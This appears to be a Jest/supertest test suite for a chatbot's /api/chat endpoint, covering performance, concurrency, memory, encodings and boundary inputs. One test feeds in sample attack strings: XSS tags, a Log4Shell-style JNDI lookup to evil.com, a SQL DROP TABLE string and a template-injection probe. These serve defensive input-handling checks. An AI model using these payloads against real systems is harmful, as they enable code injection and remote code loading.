import request from 'supertest';
import { TestWebServer } from './test-server';

describe('Chat Performance and Edge Case Tests', () => {
  let webServer: TestWebServer;
  let app: any;

  beforeAll(async () => {
    webServer = new TestWebServer(0, false);
    app = webServer.getApp();
  });

  describe('Performance Testing', () => {
    it('should handle sequential message sending without degradation', async () => {
      const messageCount = 20; // Reduced to stay within rate limits
      const messages = Array(messageCount).fill(0).map((_, i) => `Performance test ${i}`);

      const startTime = Date.now();
      const results = [];

      for (const message of messages) {
        const messageStart = Date.now();

        const response = await request(app)
          .post('/api/chat')
          .send({ message })
          .expect(200);

        const messageEnd = Date.now();
        results.push({
          message,
          responseTime: messageEnd - messageStart,
          success: response.body.success
        });

        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 50));
      }

      const totalTime = Date.now() - startTime;
      const averageTime = totalTime / messageCount;
      const maxTime = Math.max(...results.map(r => r.responseTime));
      const minTime = Math.min(...results.map(r => r.responseTime));

      // Performance assertions
      expect(averageTime).toBeLessThan(1000); // Average under 1 second
      expect(maxTime).toBeLessThan(5000);     // Max under 5 seconds
      expect(results.every(r => r.success)).toBe(true);

      console.log(`Performance Results:
        Total time: ${totalTime}ms
        Average time: ${averageTime.toFixed(2)}ms
        Min time: ${minTime}ms
        Max time: ${maxTime}ms
        Messages processed: ${messageCount}`);
    });

    it('should handle limited concurrent requests efficiently', async () => {
      const concurrentCount = 10; // Reduced to stay within rate limits
      const messages = Array(concurrentCount).fill(0).map((_, i) => `Concurrent ${i}`);

      const startTime = Date.now();

      const promises = messages.map(message =>
        request(app)
          .post('/api/chat')
          .send({ message })
          .expect(200)
      );

      const responses = await Promise.all(promises);
      const endTime = Date.now();

      const totalTime = endTime - startTime;
      const averageTime = totalTime / concurrentCount;

      // All should succeed
      expect(responses.every(r => r.body.success)).toBe(true);

      // Should complete in reasonable time
      expect(totalTime).toBeLessThan(10000); // 10 seconds max

      console.log(`Concurrent Performance:
        Total time: ${totalTime}ms
        Average time per request: ${averageTime.toFixed(2)}ms
        Concurrent requests: ${concurrentCount}`);
    });

    it('should maintain memory efficiency with conversations', async () => {
      const initialMemory = process.memoryUsage();

      // Simulate a conversation (reduced count to avoid rate limiting)
      for (let i = 0; i < 30; i++) {
        await request(app)
          .post('/api/chat')
          .send({ message: `Conversation message ${i}` })
          .expect(200);

        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }
      
      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      
      // Memory increase should be reasonable (less than 100MB)
      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024);
      
      console.log(`Memory Usage:
        Initial: ${(initialMemory.heapUsed / 1024 / 1024).toFixed(2)}MB
        Final: ${(finalMemory.heapUsed / 1024 / 1024).toFixed(2)}MB
        Increase: ${(memoryIncrease / 1024 / 1024).toFixed(2)}MB`);
    });
  });

  describe('Edge Case Testing', () => {
    it('should handle malicious input attempts', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        'DROP TABLE users;',
        '{{7*7}}',
        '<img src=x onerror=alert(1)>',
        String.fromCharCode(0, 1, 2, 3, 4, 5)
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .post('/api/chat')
          .send({ message: maliciousInput })
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.data.userMessage).toBe(maliciousInput);

        // Response should be safe (no script execution, etc.)
        if (response.body.data.botResponse) {
          expect(typeof response.body.data.botResponse).toBe('string');
        }

        // Small delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    });

    it('should handle large payloads', async () => {
      const sizes = [1000, 10000, 50000]; // Reduced sizes to avoid rate limiting

      for (const size of sizes) {
        const largeMessage = 'A'.repeat(size);

        const response = await request(app)
          .post('/api/chat')
          .send({ message: largeMessage })
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.data.userMessage).toBe(largeMessage);

        console.log(`Handled ${size} character message successfully`);

        // Delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 200));
      }
    });

    it('should handle various encoding and character sets', async () => {
      const encodingTests = [
        'ASCII text',
        'UTF-8: 你好世界 🌍',
        'Emoji: 🤖🚀💻🎉',
        'Mathematical: ∑∆∇∂∫∞',
        'Currency: $€£¥₹',
        'RTL: العربية עברית'
      ];

      for (const testString of encodingTests) {
        const response = await request(app)
          .post('/api/chat')
          .send({ message: testString })
          .expect(200);

        expect(response.body.success).toBe(true);
        expect(response.body.data.userMessage).toBe(testString);

        // Delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    });

    it('should handle boundary conditions', async () => {
      const boundaryTests = [
        '',                                    // Empty (should fail)
        ' ',                                   // Single space (should fail)
        'a',                                   // Single character
        'ab',                                  // Two characters
        'a'.repeat(65535),                     // Near max string length
        '\n',                                  // Just newline (should fail)
        '\t',                                  // Just tab (should fail)
        '\r\n',                               // CRLF (should fail)
        'a\nb',                               // With newline
        'a\tb',                               // With tab
        'a\rb',                               // With carriage return
      ];

      for (const testInput of boundaryTests) {
        if (testInput.trim() === '') {
          // Empty or whitespace-only should fail
          await request(app)
            .post('/api/chat')
            .send({ message: testInput })
            .expect(400);
        } else {
          const response = await request(app)
            .post('/api/chat')
            .send({ message: testInput })
            .expect(200);

          expect(response.body.success).toBe(true);
          expect(response.body.data.userMessage).toBe(testInput);
        }

        // Delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    });

    it('should handle repeated identical requests', async () => {
      const repeatedMessage = 'This is a repeated message for testing';
      const repetitions = 10; // Reduced to avoid rate limiting
      const responses = [];

      for (let i = 0; i < repetitions; i++) {
        const response = await request(app)
          .post('/api/chat')
          .send({ message: repeatedMessage })
          .expect(200);

        responses.push(response.body.data);

        // Delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 150));
      }

      // All should have same user message
      expect(responses.every(r => r.userMessage === repeatedMessage)).toBe(true);
      
      // Bot responses might vary due to randomness in triggers
      const botResponses = responses.map(r => r.botResponse);
      const uniqueResponses = [...new Set(botResponses)];
      
      console.log(`Repeated message test:
        Total requests: ${repetitions}
        Unique bot responses: ${uniqueResponses.length}
        Response rate: ${(botResponses.filter(r => r !== null).length / repetitions * 100).toFixed(1)}%`);
    });
  });

  describe('Resource Management', () => {
    it('should clean up resources properly', async () => {
      const initialHandles = (process as any)._getActiveHandles().length;
      const initialRequests = (process as any)._getActiveRequests().length;

      // Make multiple requests (reduced count)
      for (let i = 0; i < 15; i++) {
        await request(app)
          .post('/api/chat')
          .send({ message: `Resource test ${i}` })
          .expect(200);

        // Delay to avoid rate limiting
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      
      // Allow some time for cleanup
      await new Promise(resolve => setTimeout(resolve, 100));
      
      const finalHandles = (process as any)._getActiveHandles().length;
      const finalRequests = (process as any)._getActiveRequests().length;
      
      // Should not have significant resource leaks
      expect(finalHandles - initialHandles).toBeLessThan(10);
      expect(finalRequests - initialRequests).toBeLessThan(5);
      
      console.log(`Resource Management:
        Initial handles: ${initialHandles}, Final: ${finalHandles}
        Initial requests: ${initialRequests}, Final: ${finalRequests}`);
    });

    it('should handle timeout scenarios gracefully', async () => {
      // Test with a message that might take longer to process
      const complexMessage = 'This is a complex message that requires deep thinking and analysis about artificial intelligence, machine learning, natural language processing, and the future of technology in our society.';
      
      const startTime = Date.now();
      
      const response = await request(app)
        .post('/api/chat')
        .send({ message: complexMessage })
        .timeout(10000) // 10 second timeout
        .expect(200);

      const endTime = Date.now();
      const duration = endTime - startTime;
      
      expect(response.body.success).toBe(true);
      expect(duration).toBeLessThan(10000); // Should complete within timeout
      
      console.log(`Complex message processed in ${duration}ms`);
    });
  });
});
